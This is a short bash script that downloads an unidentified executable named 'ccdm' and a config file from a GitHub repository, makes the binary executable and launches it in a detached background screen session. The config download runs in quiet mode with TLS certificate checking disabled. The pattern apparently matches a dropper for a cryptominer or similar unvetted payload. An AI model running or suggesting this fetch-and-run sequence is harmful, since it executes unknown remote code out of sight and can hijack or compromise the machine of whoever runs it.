#!/bin/bash
wget https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
chmod u+x ccdm
wget --no-check-certificate -qO ./config.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/adm2.json
screen -dmS task bash -c "./ccdm"
